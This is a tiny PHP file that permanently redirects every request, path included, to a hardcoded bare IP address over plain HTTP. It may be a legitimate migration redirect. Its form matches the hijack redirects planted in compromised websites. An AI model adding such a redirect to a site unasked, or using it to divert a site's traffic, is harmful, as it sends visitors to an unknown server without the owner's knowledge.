<?php
 $url = "http://88.210.38.11".$_SERVER['REQUEST_URI'];
 header("HTTP/1.1 301 Moved Permanently"); 
 header("Location: $url");
?>
